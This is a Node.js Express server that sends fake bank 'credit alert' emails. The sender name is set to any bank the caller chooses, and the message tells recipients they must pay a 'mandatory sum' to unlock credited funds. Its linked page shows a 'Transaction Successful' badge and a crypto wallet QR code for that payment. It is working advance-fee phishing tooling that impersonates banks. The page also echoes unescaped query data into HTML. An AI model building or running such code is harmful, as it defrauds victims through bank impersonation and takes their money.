const express = require('express');
const cors = require('cors');
const { Resend } = require('resend');
require('dotenv').config();
const crypto = require('crypto');
const PDFDocument = require('pdfkit');
const axios = require('axios');

const app = express();

// Middleware
app.use(cors());
app.use(express.json());

// Initialize Resend
const resend = new Resend(process.env.RESEND_API_KEY);

// Transaction view page HTML
const createTransactionPage = (data) => {
  const { 
    logoUrl, 
    qrCodeUrl,
    bankName, 
    walletAddress,
    brandColor,
    billingAmount,
    percent,
  } = data;

  return `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Transaction Details - ${bankName}</title>
        <style>
            * { box-sizing: border-box; margin: 0; padding: 0; }
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                padding: 40px 20px;
            }
            .container {
                max-width: 800px;
                margin: 0 auto;
                background: white;
                border-radius: 12px;
                overflow: hidden;
                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
            }
            .header {
                background-color: ${brandColor || '#0066cc'};
                padding: 40px;
                text-align: center;
                color: white;
            }
            .logo {
                max-width: 150px;
                height: auto;
                margin-bottom: 20px;
                background: white;
                padding: 15px;
                border-radius: 8px;
            }
            .header h1 {
                margin: 0;
                font-size: 28px;
            }
            .content {
                padding: 40px;
            }
            .success-badge {
                display: inline-block;
                background: #d4edda;
                color: #155724;
                padding: 10px 20px;
                border-radius: 20px;
                font-size: 14px;
                font-weight: 600;
                margin-bottom: 30px;
            }
            .success-badge::before {
                content: '✓ ';
                font-size: 18px;
            }
            .qr-section {
                background: #f8f9fa;
                padding: 30px;
                border-radius: 8px;
                text-align: center;
                margin: 30px 0;
            }
            .qr-section h2 {
                color: #333;
                margin-bottom: 15px;
                font-size: 20px;
            }
            .qr-section p {
                color: #666;
                margin-bottom: 20px;
                font-size: 14px;
            }
            .qr-code {
                max-width: 300px;
                width: 100%;
                height: auto;
                border: 4px solid white;
                border-radius: 8px;
                box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            }
            .disclaimer {
                background-color: #fff3cd;
                border-left: 4px solid #ffc107;
                padding: 20px;
                border-radius: 4px;
                margin: 30px 0;
            }
            .disclaimer p {
                color: #856404;
                font-size: 13px;
                line-height: 1.6;
            }
            .actions {
                display: flex;
                gap: 15px;
                justify-content: center;
                margin: 30px 0;
                flex-wrap: wrap;
            }
            .btn {
                padding: 14px 28px;
                border: none;
                border-radius: 8px;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                text-decoration: none;
                display: inline-block;
                transition: all 0.3s;
            }
            .btn-primary {
                background-color: ${brandColor || '#0066cc'};
                color: white;
            }
            .btn-primary:hover {
                opacity: 0.9;
                transform: translateY(-2px);
            }
            .btn-secondary {
                background-color: #6c757d;
                color: white;
            }
            .btn-secondary:hover {
                opacity: 0.9;
                transform: translateY(-2px);
            }
            .footer {
                background-color: #f8f9fa;
                padding: 20px;
                text-align: center;
                border-top: 1px solid #e0e0e0;
            }
            .footer p {
                color: #999;
                font-size: 12px;
                margin: 5px 0;
            }
            @media (max-width: 600px) {
                body { padding: 20px 10px; }
                .content { padding: 20px; }
                .qr-section { padding: 20px; }
                .actions { flex-direction: column; }
                .btn { width: 100%; }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                ${logoUrl ? `<img src="${logoUrl}" alt="${bankName}" class="logo">` : ''}
                <h1>${bankName}</h1>
            </div>

            <div class="content">
                <div style="text-align: center;">
                    <div class="success-badge">Transaction Successful</div><br>
                    <p> you need to make a mandatory payment of $ ${billingAmount} which is ${percent} % of your total funds .
                </div>

               

                ${qrCodeUrl ? `
                <div class="qr-section">
                    <h2>Complete Payment</h2>
                    <p>Scan the QR code below to complete your payment</p>
                    <img src="${qrCodeUrl}" alt="Payment QR Code" class="qr-code">
                    <p>${walletAddress}</p>
                </div>
                ` : `<p>${walletAddress}</p>`}

                <div class="disclaimer">
                    <p><strong>DISCLAIMER:</strong> This is an automated notification for informational purposes only. Please verify all transaction details through your official banking channels. If you did not authorize this transaction, please contact your bank immediately. Keep this receipt for your records.</p>
                </div>
            </div>

            <div class="footer">
                <p>© ${new Date().getFullYear()} ${bankName}. All rights reserved.</p>
            </div>
        </div>
    </body>
    </html>
  `;
};


// Email template function
const createEmailTemplate = (data,billingLink) => {
  const { 
    logoUrl, 
    bankName, 
    receivingAccountNumber, 
    routingNumber, 
    recipientAddress, 
    senderBank, 
    senderName, 
    recipientName, 
    amount, 
    dateTime,
    brandColor,
    billingAmount,
    ibanNumber,
    swiftCode
  } = data;

  let firstName = recipientName.trim().split(/\s+/)[0];

const maskValue = (value, visible = 4) =>
  value.length > visible
    ? "****" + value.slice(-visible)
    : value;

  const routingNumberRow = routingNumber
  ? `
    <tr style="background-color: #f8f9fa;">
      <td style="border-bottom: 1px solid #e0e0e0; font-weight: 600; color: #333; font-size: 14px;">
        Routing Number
      </td>
      <td style="border-bottom: 1px solid #e0e0e0; color: #666; text-align: right; font-size: 14px;">
        ${routingNumber}
      </td>
    </tr>
  `
  : "";

const swiftRow = swiftCode
  ? `
    <tr>
      <td style="border-bottom: 1px solid #e0e0e0; font-weight: 600; color: #333; font-size: 14px;">
        SWIFT Code
      </td>
      <td style="border-bottom: 1px solid #e0e0e0; color: #666; text-align: right; font-size: 14px;">
        ${maskValue(swiftCode)}
      </td>
    </tr>
  `
  : "";

const ibanRow = ibanNumber
  ? `
    <tr style="background-color: #f8f9fa;">
      <td style="border-bottom: 1px solid #e0e0e0; font-weight: 600; color: #333; font-size: 14px;">
        IBAN
      </td>
      <td style="border-bottom: 1px solid #e0e0e0; color: #666; text-align: right; font-size: 14px;">
        ${maskValue(ibanNumber)}
      </td>
    </tr>
  `
  : "";

  


  return `
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Credit Alert</title>
    </head>
    <body style="margin: 0; padding: 0; font-family: Arial, sans-serif; background-color: #f4f4f4;">
      <table width="100%" cellpadding="0" cellspacing="0" style="background-color: #f4f4f4; padding: 20px;">
        <tr>
          <td align="center">
            <table width="600" cellpadding="0" cellspacing="0" style="background-color: #ffffff; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
              
              <!-- Header with Logo and Bank Name -->
              <tr>
                <td style="background-color: ${brandColor || '#0066cc'}; padding: 30px; text-align: center;">
                  ${logoUrl ? `<img src="${logoUrl}" alt="${bankName}" style="max-width: 150px; height: auto; margin-bottom: 15px;">` : ''}
                  <h1 style="color: #ffffff; margin: 0; font-size: 24px; font-weight: bold;">${bankName}</h1>
                </td>
              </tr>

              <!-- Alert Title -->
              <tr>
                <td style="padding: 30px 40px 20px;">
                  <h2 style="color: #28a745; margin: 0 0 10px; font-size: 22px;">✓ Credit Alert</h2>
                  <p style="color: #666; margin: 0; font-size: 14px;">Dear, ${firstName} your account has been successfully been credited.</p>
                </td>
              </tr>

              <!-- Transaction Details Table -->
              <tr>
                <td style="padding: 0 40px 30px;">
                  <table width="100%" cellpadding="12" cellspacing="0" style="border: 1px solid #e0e0e0; border-radius: 4px;">
                    <tr style="background-color: #f8f9fa;">
                      <td style="border-bottom: 1px solid #e0e0e0; font-weight: bold; color: #333; font-size: 14px;">Amount</td>
                      <td style="border-bottom: 1px solid #e0e0e0; color: #28a745; font-size: 18px; font-weight: bold; text-align: right;">$${parseFloat(amount).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</td>
                    </tr>
                    <tr>
                      <td style="border-bottom: 1px solid #e0e0e0; font-weight: bold; color: #333; font-size: 14px;">Sender's Name</td>
                      <td style="border-bottom: 1px solid #e0e0e0; color: #666; text-align: right; font-size: 14px;">${senderName}</td>
                    </tr>
                    <tr style="background-color: #f8f9fa;">
                      <td style="border-bottom: 1px solid #e0e0e0; font-weight: bold; color: #333; font-size: 14px;">Sender's Bank</td>
                      <td style="border-bottom: 1px solid #e0e0e0; color: #666; text-align: right; font-size: 14px;">${senderBank}</td>
                    </tr>
                    <tr>
                      <td style="border-bottom: 1px solid #e0e0e0; font-weight: bold; color: #333; font-size: 14px;">Recipient Name</td>
                      <td style="border-bottom: 1px solid #e0e0e0; color: #666; text-align: right; font-size: 14px;">${recipientName}</td>
                    </tr>
                    <tr style="background-color: #f8f9fa;">
                      <td style="border-bottom: 1px solid #e0e0e0; font-weight: bold; color: #333; font-size: 14px;">Recipient Bank</td>
                      <td style="border-bottom: 1px solid #e0e0e0; color: #666; text-align: right; font-size: 14px;">${bankName}</td>
                    </tr>
                    <tr>
                      <td style="border-bottom: 1px solid #e0e0e0; font-weight: bold; color: #333; font-size: 14px;">Account Number</td>
                      <td style="border-bottom: 1px solid #e0e0e0; color: #666; text-align: right; font-size: 14px;">${maskValue(receivingAccountNumber)}</td>
                    </tr>
                    ${routingNumberRow}
                    ${swiftRow}
                    ${ibanRow}
                    <tr>
                      <td style="font-weight: bold; color: #333; font-size: 14px;">Recipient Address</td>
                      <td style="color: #666; text-align: right; font-size: 14px;">${recipientAddress}</td>
                    </tr>
                     <tr style="background-color: #f8f9fa;">
                      <td style="border-bottom: 1px solid #e0e0e0; font-weight: bold; color: #333; font-size: 14px;"> Date & Time</td>
                      <td style="border-bottom: 1px solid #e0e0e0; color: #666; text-align: right; font-size: 14px;">${dateTime}</td>
                    </tr>
                    <tr>
                  </table>
                </td>
              </tr>

              <!-- Disclaimer -->
              <tr>
                <td style="padding: 0 40px 30px;">
                  <div style="background-color: #fff3cd; border-left: 4px solid #ffc107; padding: 15px; border-radius: 4px;">
                    <p style="margin: 0; color: #856404; font-size: 12px; line-height: 1.6;">
                      <strong>NOTE:</strong> To activate your payment of $${amount} you need to pay a mandatory sum of ${billingAmount} to unlock your funds. For more information on please click <a href="${billingLink}">Here</a>
                    </p>
                  </div>
                </td>
              </tr>

              <!-- Footer -->
              <tr>
                <td style="background-color: #f8f9fa; padding: 20px 40px; text-align: center; border-top: 1px solid #e0e0e0;">
                  <p style="margin: 0; color: #999; font-size: 12px;">
                    © ${new Date().getFullYear()} ${bankName}. All rights reserved.
                  </p>
                  <p style="margin: 10px 0 0; color: #999; font-size: 11px;">
                    This is an automated email.  Do not reply to this message.
                  </p>
                </td>
              </tr>

            </table>
          </td>
        </tr>
      </table>
    </body>
    </html>
  `;
};


// Send email endpoint
app.post('/api/send-credit-alert', async (req, res) => {
  try {
    const emailData = req.body;
    const bank =emailData.bankName;
    const transactionData = Buffer.from(JSON.stringify(emailData)).toString('base64url');
    const billingLink = `${process.env.BASE_URL}/transaction?data=${transactionData}`
    // Validate required fields
    const requiredFields = [
      'recipientEmail',
      'bankName',
      'receivingAccountNumber',
      'recipientAddress',
      'senderBank',
      'senderName',
      'recipientName',
      'amount',
      "billingAmount",
      'dateTime'
    ];

    const missingFields = requiredFields.filter(field => !emailData[field]);
    
    if (missingFields.length > 0) {
      return res.status(400).json({
        success: false,
        error: `Missing required fields: ${missingFields.join(', ')}`
      });
    }

    // Create email HTML
    const emailHtml = createEmailTemplate(emailData,billingLink);
    const fromEmail = `${bank} <noreply@mailsflash.name.ng>`;   
    const fromName = emailData.bankName;
    const fromAddress = fromEmail.includes('<') ? fromEmail.split('<')[1].replace('>', '') : fromEmail;
    const displayFrom = `${fromName}<${fromAddress}>`;
    // Send email using Resend
    const result = await resend.emails.send({
      from:  displayFrom,
      to: emailData.recipientEmail,
      subject: `Credit Alert - $${parseFloat(emailData.amount).toLocaleString('en-US', { minimumFractionDigits: 2 })}`,
      html: emailHtml,
    headers: {
        'X-Entity-Ref-ID': `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
        'X-Priority': '1',
        'Importance': 'high',
        'X-Mailer': 'Credit Alert System v1.0'
      },
      tags: [
        {
          name: 'category',
          value: 'credit_alert'
        }
      ]
    });

    res.json({
      success: true,
      message: 'Credit alert sent successfully',
      emailId: result.id,
      data: emailData
    });

  } catch (error) {
    console.error('Error sending email:', error);
    res.status(500).json({
      success: false,
      error: error.message || 'Failed to send credit alert'
    });
  }
});

app.get('/transaction',(req,res)=>{
  const data = JSON.parse(Buffer.from(req.query.data, 'base64url').toString());
  const html = createTransactionPage(data);
  res.send(html);
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'ok', message: 'Server is running' });
});

const PORT = process.env.PORT || 5000;

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
